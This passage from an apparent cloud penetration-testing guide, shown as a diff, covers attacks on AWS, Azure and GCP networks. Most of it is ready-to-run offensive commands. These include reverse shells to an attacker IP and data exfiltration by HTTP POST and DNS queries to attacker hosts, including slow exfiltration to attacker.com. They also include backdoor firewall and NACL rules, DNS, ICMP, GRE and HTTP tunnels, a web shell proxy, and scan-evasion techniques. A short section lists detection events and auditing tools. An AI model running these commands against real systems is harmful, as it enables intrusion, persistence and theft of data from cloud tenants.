+Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup (Get-AzNetworkSecurityGroup -Name <nsg_name>)
+
+# Check VNet peering connections
+Get-AzVirtualNetworkPeering -VirtualNetworkName <vnet_name> -ResourceGroupName <rg_name>
+```
+
+**Using MicroBurst for Azure Enumeration:**
+
+```powershell
+# Import MicroBurst
+Import-Module MicroBurst.psm1
+
+# Enumerate network resources
+Get-AzureNetworkInfo -Verbose
+
+# Extract VNet configurations
+Get-AzVirtualNetworkConfig -ExportToFile vnet-config.txt
+```
+
+### GCP VPC Enumeration
+
+**Primary Tools:**
+
+- `gcloud` - Google Cloud CLI
+- `gcpbucketbrute` - GCP-specific enumeration
+- `ScoutSuite` - Supports GCP
+
+**Core Enumeration Commands:**
+
+```bash
+# List all VPC networks
+gcloud compute networks list
+
+# Get detailed VPC information
+gcloud compute networks describe <vpc_name>
+
+# List subnets
+gcloud compute networks subnets list
+
+# Subnet details with IP ranges
+gcloud compute networks subnets describe <subnet_name> --region=<region>
+
+# List firewall rules
+gcloud compute firewall-rules list
+
+# Get specific firewall rule details
+gcloud compute firewall-rules describe <rule_name>
+
+# Enumerate routes
+gcloud compute routes list
+
+# List VPC peering connections
+gcloud compute networks peerings list --network=<vpc_name>
+
+# Show network interfaces
+gcloud compute instances list --format="table(name, networkInterfaces[].networkIP)"
+
+# List forwarding rules (load balancers)
+gcloud compute forwarding-rules list
+```
+
+**Advanced GCP Network Discovery:**
+
+```bash
+# Find all external IPs
+gcloud compute addresses list --filter="addressType=EXTERNAL"
+
+# Enumerate Cloud NAT configurations
+gcloud compute routers list
+gcloud compute routers nats list --router=<router_name> --region=<region>
+
+# Check VPC Service Controls
+gcloud access-context-manager perimeters list
+
+# List interconnect attachments
+gcloud compute interconnects attachments list
+```
+
+### Cross-Platform Enumeration Strategies
+
+**Identifying Network Topology:**
+
+1. **Map CIDR blocks and IP ranges** - Understand address space allocation
+2. **Identify public vs private subnets** - Look for routes to internet gateways
+3. **Document inter-VPC/VNet connectivity** - Peering, VPN, transit gateways
+4. **Locate network egress points** - NAT gateways, proxy servers, load balancers
+5. **Enumerate service endpoints** - Direct connections to cloud services bypassing public internet
+
+**Key Indicators of Misconfiguration:**
+
+- Overly broad CIDR blocks (e.g., /16 when /24 would suffice)
+- Default VPC/VNet usage in production
+- Missing flow logs or network monitoring
+- Unnecessary VPC peering connections
+- Public subnets with sensitive workloads
+
+---
+
+## Security Group Misconfiguration
+
+### AWS Security Group Exploitation
+
+**Understanding Security Groups:**
+
+- Stateful firewalls at the instance level
+- Applied to ENIs (Elastic Network Interfaces)
+- Default deny inbound, allow all outbound
+- Rules specify protocol, port range, and source/destination
+
+**Enumeration Commands:**
+
+```bash
+# List all security groups
+aws ec2 describe-security-groups
+
+# Get specific security group rules
+aws ec2 describe-security-groups --group-ids sg-xxxxx
+
+# Find security groups with specific rules (e.g., 0.0.0.0/0 on port 22)
+aws ec2 describe-security-groups --filters "Name=ip-permission.from-port,Values=22" \
+  --query 'SecurityGroups[*].[GroupId,GroupName,IpPermissions[?FromPort==`22`]]'
+
+# Identify instances associated with a security group
+aws ec2 describe-instances --filters "Name=instance.group-id,Values=sg-xxxxx"
+
+# Find security groups allowing 0.0.0.0/0
+aws ec2 describe-security-groups --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]'
+```
+
+**Common Misconfigurations:**
+
+1. **Unrestricted SSH/RDP Access:**
+
+```bash
+# Find SSH open to world
+aws ec2 describe-security-groups --query \
+  'SecurityGroups[?IpPermissions[?FromPort==`22` && IpRanges[?CidrIp==`0.0.0.0/0`]]].{ID:GroupId,Name:GroupName}'
+
+# Find RDP open to world (port 3389)
+aws ec2 describe-security-groups --query \
+  'SecurityGroups[?IpPermissions[?FromPort==`3389` && IpRanges[?CidrIp==`0.0.0.0/0`]]].{ID:GroupId,Name:GroupName}'
+```
+
+2. **Database Ports Exposed:**
+
+```bash
+# MySQL (3306), PostgreSQL (5432), MongoDB (27017), Redis (6379)
+aws ec2 describe-security-groups --query \
+  'SecurityGroups[?IpPermissions[?(FromPort==`3306` || FromPort==`5432` || FromPort==`27017` || FromPort==`6379`) && IpRanges[?CidrIp==`0.0.0.0/0`]]]'
+```
+
+3. **All Ports Open:**
+
+```bash
+# Find rules with -1 protocol (all traffic)
+aws ec2 describe-security-groups --query \
+  'SecurityGroups[?IpPermissions[?IpProtocol==`-1` && IpRanges[?CidrIp==`0.0.0.0/0`]]].{ID:GroupId,Name:GroupName}'
+```
+
+**Exploitation Techniques:**
+
+**1. Port Scanning Through Security Groups:**
+
+```bash
+# Use nmap against discovered open ports
+nmap -Pn -p 22,80,443,3389 <target_ip>
+
+# Service version detection on open ports
+nmap -sV -p <discovered_ports> <target_ip>
+
+# Aggressive scan for vulnerable services
+nmap -A -p- <target_ip>
+```
+
+**2. Leveraging Overly Permissive Egress Rules:**
+
+```bash
+# If you compromise an instance, test outbound connectivity
+# Most security groups allow all egress by default
+
+# Establish reverse shell (if you have code execution)
+bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1
+
+# Exfiltrate data via HTTP
+curl -X POST -d @sensitive_file.txt http://<attacker_ip>:8000/
+
+# DNS exfiltration (rarely blocked)
+for line in $(cat data.txt); do dig $line.<attacker_domain>; done
+```
+
+**3. Security Group Chaining:** [Inference] Security groups can reference other security groups as sources. If you compromise one instance, you may gain access to resources that trust that instance's security group.
+
+```bash
+# Identify security group chains
+aws ec2 describe-security-groups --query \
+  'SecurityGroups[?IpPermissions[?UserIdGroupPairs]].[GroupId,IpPermissions[?UserIdGroupPairs].UserIdGroupPairs]'
+
+# From compromised instance, attempt connections to resources in referenced groups
+```
+
+**4. Privilege Escalation via Security Group Modification:**
+
+```bash
+# If you have ec2:AuthorizeSecurityGroupIngress permissions
+aws ec2 authorize-security-group-ingress \
+  --group-id sg-xxxxx \
+  --protocol tcp \
+  --port 22 \
+  --cidr 0.0.0.0/0
+
+# Add your IP to existing security group
+aws ec2 authorize-security-group-ingress \
+  --group-id sg-xxxxx \
+  --protocol tcp \
+  --port 22 \
+  --cidr <your_ip>/32
+
+# Modify security group to allow all traffic from your IP
+aws ec2 authorize-security-group-ingress \
+  --group-id sg-xxxxx \
+  --ip-permissions IpProtocol=-1,IpRanges='[{CidrIp=<your_ip>/32}]'
+```
+
+### Azure Network Security Group (NSG) Exploitation
+
+**Understanding Azure NSGs:**
+
+- Can be applied at subnet or NIC level
+- Stateful firewall rules
+- Priority-based (100-4096, lower = higher priority)
+- Default rules cannot be deleted (DenyAllInbound, AllowVnetInbound, etc.)
+
+**Enumeration Commands:**
+
+```bash
+# List all NSGs
+az network nsg list --output table
+
+# Get NSG rules with priorities
+az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> --output table --query "[].{Name:name, Priority:priority, Direction:direction, Access:access, Protocol:protocol, SourcePort:sourcePortRange, DestPort:destinationPortRange, Source:sourceAddressPrefix, Dest:destinationAddressPrefix}"
+
+# Find NSGs with specific ports open
+az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> --query "[?destinationPortRange=='22' || destinationPortRange=='*']"
+
+# Check NSG associations
+az network nsg show --resource-group <rg_name> --name <nsg_name> --query "{Subnets:subnets[].id, NICs:networkInterfaces[].id}"
+```
+
+**PowerShell Enumeration:**
+
+```powershell
+# Get all NSGs with detailed rules
+Get-AzNetworkSecurityGroup | ForEach-Object {
+    $nsg = $_
+    Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $nsg | 
+    Select-Object @{N='NSG';E={$nsg.Name}}, Name, Priority, Direction, Access, Protocol, 
+    SourcePortRange, DestinationPortRange, SourceAddressPrefix, DestinationAddressPrefix
+}
+
+# Find rules allowing traffic from Internet
+Get-AzNetworkSecurityGroup | ForEach-Object {
+    Get-AzNetworkSecurityRuleConfig -NetworkSecurityGroup $_ | 
+    Where-Object {$_.SourceAddressPrefix -eq '*' -or $_.SourceAddressPrefix -eq 'Internet'}
+}
+
+# Check effective NSG rules on a NIC
+Get-AzEffectiveNetworkSecurityGroup -NetworkInterfaceName <nic_name> -ResourceGroupName <rg_name>
+```
+
+**Common Misconfigurations:**
+
+1. **Wildcard Sources with High Priority:**
+
+```bash
+# Find rules with priority < 1000 allowing from anywhere
+az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> \
+  --query "[?priority<1000 && sourceAddressPrefix=='*'].{Name:name, Port:destinationPortRange, Priority:priority}"
+```
+
+2. **Any-Any Rules:**
+
+```bash
+# Rules allowing all protocols from anywhere to anywhere
+az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> \
+  --query "[?protocol=='*' && sourceAddressPrefix=='*' && destinationAddressPrefix=='*']"
+```
+
+3. **Management Port Exposure:**
+
+```bash
+# Check for exposed WinRM (5985, 5986), SSH (22), RDP (3389)
+az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> \
+  --query "[?destinationPortRange=='22' || destinationPortRange=='3389' || destinationPortRange=='5985' || destinationPortRange=='5986']"
+```
+
+**Exploitation Techniques:**
+
+**1. NSG Rule Priority Manipulation:** [Inference] If you have `Microsoft.Network/networkSecurityGroups/securityRules/write` permission:
+
+```bash
+# Add high-priority allow rule
+az network nsg rule create \
+  --resource-group <rg_name> \
+  --nsg-name <nsg_name> \
+  --name AllowMyIP \
+  --priority 100 \
+  --source-address-prefixes <your_ip>/32 \
+  --destination-port-ranges '*' \
+  --access Allow \
+  --protocol '*'
+
+# Using PowerShell
+Add-AzNetworkSecurityRuleConfig -Name "BackdoorRule" -NetworkSecurityGroup $nsg `
+  -Priority 100 -Direction Inbound -Access Allow -Protocol * `
+  -SourceAddressPrefix "<your_ip>/32" -SourcePortRange * `
+  -DestinationAddressPrefix * -DestinationPortRange *
+Set-AzNetworkSecurityGroup -NetworkSecurityGroup $nsg
+```
+
+**2. Service Tag Abuse:** Azure NSGs support service tags like `Internet`, `VirtualNetwork`, `AzureLoadBalancer`. [Inference] Misuse of these can create unintended access.
+
+```bash
+# Check for overly broad service tag usage
+az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> \
+  --query "[?sourceAddressPrefix=='Internet' || sourceAddressPrefix=='*']"
+```
+
+**3. Application Security Group (ASG) Exploitation:** [Inference] ASGs group NICs logically. If an NSG rule references an ASG, compromising any VM in that ASG grants access to other resources.
+
+```bash
+# List ASGs
+az network asg list --output table
+
+# Find NSG rules using ASGs
+az network nsg rule list --resource-group <rg_name> --nsg-name <nsg_name> \
+  --query "[?sourceApplicationSecurityGroups || destinationApplicationSecurityGroups]"
+```
+
+### GCP Firewall Rule Exploitation
+
+**Understanding GCP Firewall Rules:**
+
+- Applied at VPC network level
+- Stateful connections
+- Priority-based (0-65535, lower = higher priority)
+- Targets can be tags, service accounts, or all instances
+
+**Enumeration Commands:**
+
+```bash
+# List all firewall rules
+gcloud compute firewall-rules list
+
+# Get detailed rule information
+gcloud compute firewall-rules describe <rule_name>
+
+# Find rules allowing from anywhere (0.0.0.0/0)
+gcloud compute firewall-rules list --format="table(name,sourceRanges.list():label=SOURCE_RANGES,allowed[].map().firewall_rule().list():label=ALLOW,targetTags.list():label=TARGET_TAGS)" --filter="sourceRanges:0.0.0.0/0"
+
+# Find SSH rules
+gcloud compute firewall-rules list --filter="allowed.ports:22"
+
+# Check rules by priority
+gcloud compute firewall-rules list --format="table(name,priority,direction,disabled)" --sort-by=priority
+```
+
+**Common Misconfigurations:**
+
+1. **Default-Allow Rules Still Active:**
+
+```bash
+# Check for default rules (created with VPC)
+gcloud compute firewall-rules list --filter="name~^default-"
+
+# Default rules often include:
+# - default-allow-icmp (ICMP from anywhere)
+# - default-allow-internal (all protocols within VPC)
+# - default-allow-rdp (RDP from anywhere)
+# - default-allow-ssh (SSH from anywhere)
+```
+
+2. **Overly Permissive Source Ranges:**
+
+```bash
+# Find rules with 0.0.0.0/0 source
+gcloud compute firewall-rules list --format="table(name,sourceRanges,allowed)" \
+  --filter="sourceRanges:0.0.0.0/0 AND direction=INGRESS"
+```
+
+3. **Network Tag Misuse:**
+
+```bash
+# List rules by target tags
+gcloud compute firewall-rules list --format="table(name,targetTags.list(),allowed)"
+
+# Check which instances have specific tags
+gcloud compute instances list --format="table(name,tags.items.list())"
+```
+
+**Exploitation Techniques:**
+
+**1. Instance Tag Manipulation:** [Inference] If you have `compute.instances.setTags` permission:
+
+```bash
+# Add a tag to your compromised instance that matches permissive firewall rules
+gcloud compute instances add-tags <instance_name> \
+  --tags <target_tag> \
+  --zone <zone>
+
+# Example: Adding 'web-server' tag if firewall allows HTTP/HTTPS to 'web-server' tag
+gcloud compute instances add-tags my-instance --tags web-server --zone us-central1-a
+```
+
+**2. Creating Backdoor Firewall Rules:** [Inference] If you have `compute.firewalls.create` permission:
+
+```bash
+# Create high-priority rule allowing your IP
+gcloud compute firewall-rules create backdoor-rule \
+  --network <vpc_name> \
+  --priority 1 \
+  --direction INGRESS \
+  --action ALLOW \
+  --rules tcp:1-65535,udp:1-65535,icmp \
+  --source-ranges <your_ip>/32
+
+# Create rule targeting specific instances by tag
+gcloud compute firewall-rules create access-db \
+  --network <vpc_name> \
+  --priority 100 \
+  --direction INGRESS \
+  --action ALLOW \
+  --rules tcp:5432 \
+  --source-ranges <your_ip>/32 \
+  --target-tags database
+```
+
+**3. Firewall Rule Modification:**
+
+```bash
+# Update existing rule (requires compute.firewalls.update)
+gcloud compute firewall-rules update <rule_name> \
+  --source-ranges <your_ip>/32,<existing_ranges>
+
+# Disable a deny rule temporarily
+gcloud compute firewall-rules update <deny_rule_name> --disabled
+```
+
+**4. Hierarchical Firewall Policy Bypass:** [Inference] GCP supports hierarchical firewall policies at organization/folder level. VPC-level rules can sometimes bypass these if not properly configured.
+
+```bash
+# Check hierarchical policies (requires org-level access)
+gcloud compute firewall-policies list --organization <org_id>
+
+# If VPC rules are processed before hierarchical policies, create VPC-level allow rules
+```
+
+### Detection and Defense Considerations
+
+**Anomalous Security Group Changes:**
+
+- AWS CloudTrail events: `AuthorizeSecurityGroupIngress`, `RevokeSecurityGroupIngress`
+- Azure Activity Log: `Microsoft.Network/networkSecurityGroups/securityRules/write`
+- GCP Cloud Audit Logs: `v1.compute.firewalls.insert`, `v1.compute.firewalls.patch`
+
+**Automated Detection Tools:**
+
+- **Prowler** (AWS): `check22`, `check21` for security group auditing
+- **ScoutSuite**: Flags overly permissive rules across all platforms
+- **CloudMapper** (AWS): Visualizes security group relationships
+- **Cloud Custodian**: Policy-as-code enforcement for security groups
+
+---
+
+## Network ACL Bypass
+
+### AWS Network ACL (NACL) Analysis
+
+**Understanding NACLs:**
+
+- Stateless firewalls at the subnet level
+- Separate inbound and outbound rules
+- Evaluated by rule number (lowest first)
+- Default NACL allows all traffic; custom NACLs deny all by default
+- Must explicitly allow both request and response traffic
+
+**Enumeration Commands:**
+
+```bash
+# List all NACLs
+aws ec2 describe-network-acls
+
+# Get NACL for specific subnet
+aws ec2 describe-network-acls --filters "Name=association.subnet-id,Values=subnet-xxxxx"
+
+# View NACL rules in order
+aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
+  --query 'NetworkAcls[*].Entries' --output table
+
+# Find custom NACLs (non-default)
+aws ec2 describe-network-acls --filters "Name=default,Values=false"
+
+# Check NACL associations
+aws ec2 describe-network-acls --query 'NetworkAcls[*].[NetworkAclId,Associations[*].SubnetId]'
+```
+
+**Common Misconfigurations:**
+
+1. **Ephemeral Port Range Not Allowed:** NACLs must allow ephemeral ports (typically 1024-65535) for return traffic. Missing this breaks outbound-initiated connections.
+
+```bash
+# Check for missing ephemeral port rules
+aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
+  --query 'NetworkAcls[*].Entries[?RuleNumber<32767 && Egress==false && PortRange.To<1024]'
+```
+
+2. **Rule Number Gaps:** Lower-numbered deny rules take precedence. [Inference] Inserting rules between existing rules can bypass restrictions.
+
+```bash
+# View rules with numbers to identify gaps
+aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
+  --query 'NetworkAcls[*].Entries[*].[RuleNumber,Protocol,RuleAction,CidrBlock,PortRange]' \
+  --output table
+```
+
+3. **Default Allow-All NACLs:**
+
+```bash
+# Find subnets using default NACLs
+aws ec2 describe-network-acls --filters "Name=default,Values=true" \
+  --query 'NetworkAcls[*].[NetworkAclId,Associations[*].SubnetId]'
+```
+
+**Bypass Techniques:**
+
+**1. Exploiting Stateless Nature:** Unlike security groups, NACLs don't track connection state. [Inference] If outbound rules are permissive, you can establish reverse connections even if inbound is restricted.
+
+```bash
+# From compromised instance in restricted subnet:
+# If egress allows TCP to your IP, establish reverse shell
+bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'
+
+# Or use HTTP/DNS tunneling if those protocols are allowed outbound
+# DNS tunneling via iodine
+iodine -f <attacker_domain>
+
+# HTTP tunneling via reverse proxy
+ssh -R 8080:localhost:8080 <attacker_ip>
+```
+
+**2. Protocol Confusion:** [Inference] NACLs specify protocol by number. Misconfigured rules might allow unexpected protocols.
+
+```bash
+# Check for rules allowing all protocols (-1)
+aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
+  --query 'NetworkAcls[*].Entries[?Protocol==`-1`]'
+
+# Common protocols:
+# 6 = TCP
+# 17 = UDP  
+# 1 = ICMP
+# -1 = ALL
+
+# Test ICMP tunneling if ICMP allowed but TCP/UDP blocked
+# Using ptunnel
+ptunnel -p <pivot_host> -lp 8000 -da <target_ip> -dp 22
+```
+
+**3. Source Port Exploitation:** [Inference] Some NACL rules only filter destination ports, forgetting source port filtering on response traffic.
+
+```bash
+# If NACL blocks port 443 inbound but allows port 443 outbound:
+# Use source port 443 for your attack traffic
+nmap --source-port 443 <target_ip>
+
+# Bind reverse shell to use source port 443
+nc -lvnp 443 # on attacker
+nc <attacker_ip> 443 -p 443 -e /bin/bash # from target
+```
+
+**4. NACL Rule Insertion:** [Inference] If you have `ec2:CreateNetworkAclEntry` permissions:
+
+```bash
+# Insert allow rule with lower rule number than deny rule
+aws ec2 create-network-acl-entry \
+  --network-acl-id acl-xxxxx \
+  --rule-number 50 \
+  --protocol tcp \
+  --port-range From=22,To=22 \
+  --cidr-block <your_ip>/32 \
+  --rule-action allow \
+  --ingress
+
+# Delete restrictive rule
+aws ec2 delete-network-acl-entry \
+  --network-acl-id acl-xxxxx \
+  --rule-number 100 \
+  --ingress
+```
+
+**5. Subnet Hopping:** [Inference] NACLs are subnet-specific. If you compromise an instance in a less-restricted subnet, pivot from there.
+
+```bash
+# From compromised instance in permissive subnet:
+# Scan internal resources in restricted subnets
+nmap -sT <target_subnet_range>
+
+# Use as SOCKS proxy
+ssh -D 8080 <compromised_instance>
+# Then route traffic through proxy
+
+# Port forwarding to reach restricted resources
+ssh -L 3389:<restricted_ip>:3389 <compromised_instance>
+```
+
+### Azure NSG Subnet-Level Rules
+
+Azure NSGs at subnet level function similarly to AWS NACLs but are stateful. Key differences:
+
+**Enumeration:**
+
+```bash
+# Find subnet-level NSG assignments
+az network vnet subnet list --resource-group <rg_name> --vnet-name <vnet_name> \
+  --query "[].{Name:name, NSG:networkSecurityGroup.id}"
+
+# View effective security rules (combines NIC and subnet NSGs)
+az network nic list-effective-nsg --resource-group <rg_name> --name <nic_name>
+```
+
+**Bypass Considerations:**
+
+**1. NIC-Level Override:** [Inference] If subnet NSG is restrictive but NIC-level NSG is permissive, NIC rules are evaluated first for inbound traffic.
+
+```bash
+# Check rule evaluation order
+az network nic list-effective-nsg --resource-group <rg_name> --name <nic_name> \
+  --query "effectiveSecurityRules[].{Name:name, Source:source, Priority:priority}" \
+  --output table
+
+# Look for "DefaultSecurityRules" vs "SecurityRule" (custom)
+# User-defined rules (100-4096) processed before defaults (65000+)
+```
+
+**2. Service Endpoints Bypass:** [Inference] Service endpoints allow direct access to Azure services bypassing NSG rules for that traffic.
+
+```bash
+# Check service endpoints on subnet
+az network vnet subnet show --resource-group <rg_name> \
+  --vnet-name <vnet_name> --name <subnet_name> \
+  --query serviceEndpoints
+
+# Common service endpoints:
+# - Microsoft.Storage (Blob, File, Queue, Table)
+# - Microsoft.Sql
+# - Microsoft.KeyVault
+```
+
+**3. Private Endpoints:** [Inference] Private endpoints create ENI in your VNet for PaaS services, bypassing subnet NSGs intended to restrict service access.
+
+```bash
+# List private endpoints
+az network private-endpoint list --output table
+
+# Check private endpoint connections
+az network private-endpoint-connection list --name <service_name> --resource-group <rg_name> --type <service_type>
+```
+
+### GCP VPC Firewall Hierarchies
+
+GCP has multiple firewall layers that can be exploited or bypassed:
+
+**1. VPC Firewall Rules (VPC-level)** **2. Hierarchical Firewall Policies (Org/Folder-level)** **3. Implied Rules (default-allow-internal, etc.)**
+
+**Enumeration:**
+
+```bash
+# List VPC firewall rules by priority
+gcloud compute firewall-rules list --sort-by priority
+
+# Check hierarchical policies (requires appropriate IAM)
+gcloud compute firewall-policies list --organization <org_id>
+
+# Get effective firewalls for an instance
+gcloud compute instances get-effective-firewalls <instance_name> --zone <zone>
+```
+
+**Bypass Techniques:**
+
+**1. Implied Rules Exploitation:** GCP has implicit allow rules for internal VPC traffic that can't be deleted:
+
+```bash
+# default-allow-internal: Allows all protocols from 10.0.0.0/8 (internal VPC range)
+# If you compromise any instance in the VPC:
+# Scan entire internal network freely
+
+nmap -sT 10.0.0.0/8 -p 22,80,443,3389,5432,3306
+
+# Establish lateral movement paths
+
+# Internal traffic typically less monitored than external
+````
+
+**2. Priority Manipulation:**
+[Inference] VPC firewall rules override hierarchical policies if priorities conflict. Create low-priority VPC rules to bypass org-level restrictions.
+
+```bash
+# If you have compute.firewalls.create at project level:
+# Create priority 0 rule (highest priority)
+gcloud compute firewall-rules create bypass-org-policy \
+  --network <vpc_name> \
+  --priority 0 \
+  --direction INGRESS \
+  --action ALLOW \
+  --rules all \
+  --source-ranges <your_ip>/32 \
+  --target-tags compromised-instance
+
+# Add tag to your instance
+gcloud compute instances add-tags <instance_name> \
+  --tags compromised-instance \
+  --zone <zone>
+````
+
+**3. VPC Peering Firewall Bypass:** [Inference] Firewall rules in peered VPCs are not automatically shared. Traffic between peered VPCs only evaluated by local VPC rules.
+
+```bash
+# List VPC peerings
+gcloud compute networks peerings list --network <vpc_name>
+
+# Check peering configuration
+gcloud compute networks peerings describe <peering_name> --network <vpc_name>
+
+# If you compromise instance in peered VPC with more permissive rules:
+# Use as pivot to access restricted resources in original VPC
+```
+
+**4. Shared VPC Exploitation:** [Inference] In Shared VPC setup, service projects inherit host project firewall rules but can add their own. Conflicting rules create bypass opportunities.
+
+```bash
+# Check if VPC is shared
+gcloud compute shared-vpc get-host-project <project_id>
+
+# List associated service projects
+gcloud compute shared-vpc list-associated-resources <host_project_id>
+
+# If you're in service project, create project-specific rules
+gcloud compute firewall-rules create service-project-bypass \
+  --network <shared_vpc_name> \
+  --priority 50 \
+  --direction INGRESS \
+  --action ALLOW \
+  --rules tcp:22 \
+  --source-ranges <your_ip>/32 \
+  --project <service_project_id>
+```
+
+### Advanced NACL/Firewall Bypass Techniques
+
+**1. Fragmentation Attacks:** [Inference] Some network ACLs/firewalls don't properly reassemble fragmented packets, allowing bypass of port-based rules.
+
+```bash
+# Use nmap with fragmentation
+nmap -f <target_ip> -p <blocked_port>
+
+# More aggressive fragmentation
+nmap -ff <target_ip> -p <blocked_port>
+
+# Custom fragment size with scapy
+from scapy.all import *
+packet = IP(dst="<target_ip>", flags="MF")/TCP(dport=<blocked_port>)
+send(fragment(packet, fragsize=8))
+```
+
+**2. IP Protocol Tunneling:** [Inference] If NACL/firewall blocks TCP/UDP but allows other IP protocols:
+
+```bash
+# Check allowed protocols
+# AWS NACL
+aws ec2 describe-network-acls --network-acl-ids acl-xxxxx \
+  --query 'NetworkAcls[*].Entries[?RuleAction==`allow`].Protocol'
+
+# Common protocol numbers:
+# 4 = IP-in-IP
+# 41 = IPv6 encapsulation
+# 47 = GRE
+# 50 = ESP (IPsec)
+# 51 = AH (IPsec)
+
+# If GRE (47) allowed, use GRE tunnel
+# On attacker server:
+ip tunnel add gre1 mode gre remote <target_ip> local <attacker_ip>
+ip addr add 192.168.100.1/30 dev gre1
+ip link set gre1 up
+
+# On compromised target:
+ip tunnel add gre1 mode gre remote <attacker_ip> local <target_ip>
+ip addr add 192.168.100.2/30 dev gre1
+ip link set gre1 up
+
+# Now SSH through GRE tunnel
+ssh user@192.168.100.2
+```
+
+**3. ICMP Tunneling:** ICMP often allowed for diagnostics but can carry data:
+
+```bash
+# Using icmptunnel
+# On attacker (requires root):
+./icmptunnel -s
+
+# On target:
+./icmptunnel <attacker_ip>
+
+# Or use Hans (ICMP tunnel)
+# Server side:
+hans -s 10.1.2.0 -p <password>
+
+# Client side:
+hans -c <attacker_ip> -p <password>
+
+# Or ping tunnel
+# Server:
+ptunnel -x <password>
+
+# Client:
+ptunnel -p <attacker_ip> -lp 8000 -da <internal_target> -dp 22 -x <password>
+```
+
+**4. DNS Tunneling:** DNS typically allowed outbound and rarely blocked:
+
+```bash
+# Using iodine
+# Server setup (you need a domain):
+iodined -f 10.0.0.1 -P <password> tunnel.yourdomain.com
+
+# Client (from compromised instance):
+iodine -f -P <password> tunnel.yourdomain.com
+
+# Test tunnel:
+ssh user@10.0.0.1
+
+# Using dnscat2 (more feature-rich)
+# Server:
+ruby dnscat2.rb tunnel.yourdomain.com
+
+# Client:
+./dnscat tunnel.yourdomain.com
+```
+
+**5. HTTP/HTTPS Tunneling:** If web traffic allowed but direct connections blocked:
+
+```bash
+# Using Chisel (HTTP tunnel)
+# Server (attacker):
+chisel server -p 8080 --reverse
+
+# Client (target):
+chisel client <attacker_ip>:8080 R:3389:127.0.0.1:3389
+
+# Using reGeorg web shell tunnel
+# Upload reGeorg webshell to accessible web server
+# Then create SOCKS proxy:
+python reGeorgSocksProxy.py -p 8080 -u http://target.com/tunnel.php
+
+# Configure proxychains to use localhost:8080
+proxychains nmap <internal_target>
+
+# SSH over HTTP using corkscrew
+# Install corkscrew, configure in ~/.ssh/config:
+Host internal-server
+    ProxyCommand corkscrew <proxy_ip> 8080 %h %p
+```
+
+**6. Port Knocking:** [Inference] If NACL/firewall rules change based on specific packet sequences:
+
+```bash
+# Using knock
+knock <target_ip> 1000 2000 3000
+
+# Then attempt connection
+ssh user@<target_ip>
+
+# Using nmap for custom knock sequence
+nmap -Pn --max-retries 0 -p 1000 <target_ip>
+nmap -Pn --max-retries 0 -p 2000 <target_ip>
+nmap -Pn --max-retries 0 -p 3000 <target_ip>
+
+# Using hping3 with TCP flags
+hping3 -S -p 1000 -c 1 <target_ip>
+hping3 -S -p 2000 -c 1 <target_ip>
+hping3 -S -p 3000 -c 1 <target_ip>
+```
+
+### Traffic Analysis and Evasion
+
+**Packet Capture in Cloud Environments:**
+
+**AWS VPC Flow Logs Analysis:**
+
+```bash
+# Enable flow logs (if you have permissions)
+aws ec2 create-flow-logs \
+  --resource-type VPC \
+  --resource-ids vpc-xxxxx \
+  --traffic-type ALL \
+  --log-destination-type s3 \
+  --log-destination arn:aws:s3:::my-flow-logs/
+
+# Query flow logs (if stored in CloudWatch)
+aws logs filter-log-events \
+  --log-group-name /aws/vpc/flowlogs \
+  --filter-pattern "[version, account, eni, source, destination, srcport, destport=22, protocol=6, packets, bytes, start, end, action=REJECT, status]"
+
+# Download and analyze S3-stored flow logs
+aws s3 sync s3://flow-log-bucket/AWSLogs/ ./flow-logs/
+```
+
+**Azure NSG Flow Logs:**
+
+```bash
+# Check flow log status
+az network watcher flow-log list --resource-group <rg_name>
+
+# Configure flow logs
+az network watcher flow-log create \
+  --resource-group <rg_name> \
+  --nsg <nsg_name> \
+  --storage-account <storage_account> \
+  --location <region> \
+  --name <flow_log_name>
+
+# Query with PowerShell
+Get-AzNetworkWatcherFlowLog -ResourceGroupName <rg_name> -Name <flow_log_name>
+```
+
+**GCP VPC Flow Logs:**
+
+```bash
+# Enable flow logs on subnet
+gcloud compute networks subnets update <subnet_name> \
+  --region <region> \
+  --enable-flow-logs \
+  --logging-aggregation-interval=interval-5-sec \
+  --logging-flow-sampling=1.0
+
+# Query flow logs in Cloud Logging
+gcloud logging read "resource.type=gce_subnetwork AND logName=projects/<project_id>/logs/compute.googleapis.com%2Fvpc_flows" \
+  --limit 50 \
+  --format json
+
+# Using log filters for denied traffic
+gcloud logging read "resource.type=gce_subnetwork AND jsonPayload.reporter=DEST AND jsonPayload.disposition=DENIED" \
+  --limit 50
+```
+
+**Evasion Techniques:**
+
+**1. Timing-Based Evasion:** [Inference] Flow logs may aggregate data over time intervals. Slow, sporadic traffic may avoid detection.
+
+```bash
+# Slow scan with nmap
+nmap -T0 <target_ip> # Paranoid timing (wait 5 min between probes)
+nmap -T1 <target_ip> # Sneaky timing
+
+# Rate-limited data exfiltration
+for chunk in $(split -b 1K sensitive_data.txt); do
+  curl -X POST -d @$chunk http://attacker.com/collect
+  sleep 300 # 5 minute delay
+done
+```
+
+**2. Protocol Mimicry:** [Inference] Make malicious traffic look like legitimate protocols:
+
+```bash
+# HTTP traffic masquerading
+# Instead of raw TCP connection, wrap in HTTP
+curl -X POST http://<target_ip>:<port>/path -H "Content-Type: application/x-www-form-urlencoded" -d "cmd=whoami"
+
+# DNS tunneling (looks like legitimate DNS queries)
+# Already covered above with iodine/dnscat2
+
+# HTTPS tunneling (encrypted, harder to inspect)
+# Use TLS wrapping for any protocol
+stunnel configuration or similar
+```
+
+**3. Decoy Traffic:** [Inference] Generate legitimate-looking traffic to hide malicious activity:
+
+```bash
+# Nmap decoy scanning
+nmap -D RND:10 <target_ip> # Use 10 random decoys
+nmap -D <decoy1>,<decoy2>,ME,<decoy3> <target_ip> # Specify decoys
+
+# Mix malicious requests with normal ones
+while true; do
+  curl http://target.com/normal_page # Legitimate
